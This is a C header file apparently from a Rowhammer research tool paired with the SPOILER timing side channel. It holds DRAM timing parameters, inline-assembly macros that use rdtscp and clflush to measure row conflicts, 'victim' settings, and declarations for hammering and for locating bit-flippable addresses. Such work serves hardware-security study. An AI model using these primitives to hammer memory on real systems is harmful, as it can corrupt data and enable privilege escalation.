
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/statvfs.h>
#include <stdint.h> // uint64_t
#include <stdlib.h> // For malloc
#include <string.h> // For memset
#include <time.h>
#include <fcntl.h>	// For O_RDONLY in get_physical_addr fn
#include <unistd.h> // For pread in get_physical_addr fn, for usleep
#include <sys/mman.h>
#include <stdbool.h> // For bool
#include <sys/stat.h>
#include <errno.h>
#include <sched.h>
#include <sys/wait.h>
#include <regex.h>

#define DDR4
#define PAGE_SIZE 4096
// SPOILER parameters
#ifdef DDR4
#define PAGE_COUNT (256 * (uint64_t)512) // ARG2 is the buffer size in MB
#define CORE 6

// #define CONT_WINDOW_SIZE 128				// MB
#define CONT_WINDOW_SIZE 8 // MB
#define THRESH_OUTLIER 900 // Adjust after looking at outliers in t2.txt
// #define THRESH_LOW 400		// Adjust after looking at diff(t2.txt)
// #define THRESH_HI 800		// Adjust after looking at diff(t2.txt)

#else
// DDR3 parameters
#define PAGE_COUNT (256 * (uint64_t)2048) // ARG2 is the buffer size in MB
#define CONT_WINDOW_SIZE 32				  // MB
#define THRESH_OUTLIER 700				  // Adjust after looking at outliers in t2.txt
#define THRESH_LOW 300					  // Adjust after looking at diff(t2.txt)
#define THRESH_HI 400					  // Adjust after looking at diff(t2.txt)
#endif
// Row Conflict parameters
#define PEAKS PAGE_COUNT
#define ROW_CONFLICT_ROUNDS 300
#define SPOILER_ROUNDS 100
#define ROUNDS2 1500
#define ROW_CONFLICT_OUTLIER_THRESHOLD 650 // Adjust after looking at outliers in t2.txt
#ifdef DDR4
#define BANKS 1
#else
#define BANKS 16 // Adjust according to the output of >> sudo decode-dimms | grep "Banks x Rows x Columns x Bits"
#endif

// Victim parameters
#define TARGET_SIZE 4
#define IN_BINARY_OFFSET 0

struct addr_space
{
	uint8_t **memory_addresses;
	int length;
};

typedef struct
{
	uint64_t dist;
	uint64_t val;
} FingerprintEntry;

// Measure_read
#define measure(_memory, _time)        \
	do                                 \
	{                                  \
		register uint32_t _delta;      \
		asm volatile(                  \
			"rdtscp;"                  \
			"mov %%eax, %%esi;"        \
			"mov (%%rbx), %%eax;"      \
			"rdtscp;"                  \
			"mfence;"                  \
			"sub %%esi, %%eax;"        \
			"mov %%eax, %%ecx;"        \
			: "=c"(_delta)             \
			: "b"(_memory)             \
			: "esi", "r11");           \
		*(uint32_t *)(_time) = _delta; \
	} while (0)

// Row_conflict
#define clfmeasure(_memory, _memory2, _time) \
	do                                       \
	{                                        \
		register uint32_t _delta;            \
		asm volatile(                        \
			"mov %%rdx, %%r11;"              \
			"clflush (%%r11);"               \
			"clflush (%%rbx);"               \
			"mfence;"                        \
			"rdtsc;"                         \
			"mov %%eax, %%esi;"              \
			"mov (%%rbx), %%ebx;"            \
			"mov (%%r11), %%edx;"            \
			"rdtscp;"                        \
			"sub %%esi, %%eax;"              \
			"mov %%eax, %%ecx;"              \
			: "=c"(_delta)                   \
			: "b"(_memory), "d"(_memory2)    \
			: "esi", "r11");                 \
		*(uint32_t *)(_time) = _delta;       \
	} while (0)

uint64_t get_physical_addr(uint64_t virtual_addr);
uint64_t get_physical_addr_pid(uint64_t virtual_addr, pid_t pid);

int get_current_cpu();

void hammer(uint64_t _memory, uint64_t _memory2);
void hammer_single(uint64_t _memory);

void print_addr_space(struct addr_space *as);
int getIndex(uint64_t addr, uint8_t *myBank, int bankLength);
int get_index_of_address(uint64_t current_flippy, struct addr_space *myBank);
int detectMemType();
int get_current_cpu_core();

void getFlippyAddressesDDR3(struct addr_space *myBank);
void getFlippyAddressesDDR4(struct addr_space *myBank);
void profileDDR4(struct addr_space *myBank);
void append_row_conflict(const char *filename, uint64_t virt_addr, int MAX_LINE_LENGTH);
void trigger_segfault();
int is_root();
int getCurrentCore();
